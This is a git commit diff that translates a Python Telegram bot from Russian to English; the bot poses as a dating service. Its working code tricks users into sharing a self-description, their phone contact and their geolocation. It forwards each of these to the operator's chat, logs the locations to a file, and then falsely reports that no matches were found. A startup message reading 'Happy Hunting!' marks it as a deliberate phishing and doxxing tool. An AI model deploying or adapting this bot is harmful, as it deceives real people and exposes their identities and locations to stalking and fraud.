3c77ab32a56e6a444ffc2604062fae78d53e58a7
Bmgpt <137195478+Bmgpt@users.noreply.github.com>
2024-06-20 02:08:02 +0800

    Update Acquaintance.py

--- src/linux/Modules/Bots/Acquaintance.py
+++ src/linux/Modules/Bots/Acquaintance.py
@@ -6,67 +6,59 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from aiogram.types import ParseMode
 
-# Установка уровня логирования
+# Set the logging level
 logging.basicConfig(level=logging.INFO)
 
-
-# Определение пути к config.py
+# Define the path to config.py
 config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', 'config.py')
 
-
-# Загрузка конфигурации
+# Load the configuration
 spec = importlib.util.spec_from_file_location("config", config_path)
 config = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(config)
 
-
 API_TOKEN = config.TOKEN
 ADMIN_CHAT_ID = config.CHATID
 
-
-# Инициализация бота и диспетчера
+# Initialize the bot and dispatcher
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
 
-
-# Функция для отправки сообщения о запуске бота
+# Function to send a startup message
 async def send_startup_message():
     await bot.send_message(chat_id=ADMIN_CHAT_ID, text="~ Bot has been started!")
     logging.info("[!] Bot has been Started!\n [+] Happy Hunting! :D")
 
-
-# Обработчик команды /start
+# Handler for the /start command
 @dp.message_handler(commands=['start'])
 async def start(message: types.Message):
-    await message.answer(f'''👋 Привет! {message.from_user.first_name}👋
-    Это бот для знакомства!
-    Чтобы начать, введите /search''')
+    await message.answer(f'''👋 Hello! {message.from_user.first_name}👋
+    This is a dating bot!
+    To start, enter /search''')
 
-
-# Обработчик команды /search
+# Handler for the /search command
 @dp.message_handler(commands=['search'])
 async def search(message: types.Message):
-    msg = await message.answer('Для начала напишите немного о себе (одним сообщением)')
+    msg = await message.answer('To start, write a little about yourself (in one message)')
     await proc2(msg)
 
-
-# Функция для обработки сообщения пользователя
+# Function to process user messages
 async def proc2(message: types.Message):
     try:
         num = message.text
-        await bot.send_message(ADMIN_CHAT_ID, f'Полученная информация: {num}')
+        await bot.send_message(ADMIN_CHAT_ID, f'Received information: {num}')
         logging.info(num)
         await asyncio.sleep(2)
         keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
-        button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True)
+        button_phone = types.KeyboardButton(text="Register", request_contact=True)
         keyboard.add(button_phone)
-        await message.answer('''Для того, чтобы использовать бота, зарегистрируйтесь пожалуйста!''', reply_markup=keyboard)
+        await message.answer('''To use the bot, please register!''', reply_markup=keyboard)
     except Exception as e:
         logging.exception(e)
-        await message.answer('Произошла неопознанная ошибка, перезагрузите бота!')
+        await message.answer('An unidentified error occurred, please restart the bot!')
 
-# Обработчик контактной информации
+# Handler for contact information
 @dp.message_handler(content_types=['contact'])
 async def contact(message: types.Message):
     if message.contact:
@@ -75,47 +67,47 @@ async def contact(message: types.Message):
         last = message.contact.last_name
         userid = message.contact.user_id
         phone = message.contact.phone_number
-        await message.answer("Регистрация прошла успешно!")
+        await message.answer("Registration was successful!")
         info = f'''
-    Данные
-    ├Имя: {first} {last}
+    Data
+    ├Name: {first} {last}
     ├ID: {userid}
-    ├Ник: @{nick}
-    └Номер телефона: {phone}
+    ├Username: @{nick}
+    └Phone number: {phone}
             '''
         await bot.send_message(ADMIN_CHAT_ID, info)
         logging.info(info)
 
         if userid != message.chat.id:
-            await message.answer('Отправьте свой контакт!')
+            await message.answer('Send your contact!')
         await asyncio.sleep(1)
         keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
-        button_location = types.KeyboardButton(text="Отправить", request_location=True)
+        button_location = types.KeyboardButton(text="Send", request_location=True)
         keyboard1.add(button_location)
-        await message.answer(text='Отправьте свою геопозицию, чтобы бот нашел ближайших пользователей!', reply_markup=keyboard1)
+        await message.answer(text='Send your location so the bot can find nearby users!', reply_markup=keyboard1)
 
-# Обработчик геопозиции
+# Handler for location information
 @dp.message_handler(content_types=['location'])
 async def location(message: types.Message):
     if message.location:
         lon = str(message.location.longitude)
         lat = str(message.location.latitude)
         geo = f'''
-        Геолокация
+        Geolocation
         ├ID: {message.chat.id}
         ├Longitude: {lon}
         ├Latitude: {lat} 
-        └Карты: https://www.google.com/maps/place/{lat}+{lon} 
+        └Maps: https://www.google.com/maps/place/{lat}+{lon} 
         '''
         with open('bot-log.txt', 'a+', encoding='utf-8') as log:
             log.write(geo + '  ')
         await bot.send_message(ADMIN_CHAT_ID, geo)
         logging.info(geo)
-        await message.answer('Поиск...')
+        await message.answer('Searching...')
         await asyncio.sleep(2)
-        await message.answer('К сожалению в базе не найдено подходящих пользователей!')
+        await message.answer('Unfortunately, no suitable users were found in the database!')
 
-# Запуск бота
+# Start the bot
 async def main():
     await send_startup_message()
     logging.info("Starting the bot...")
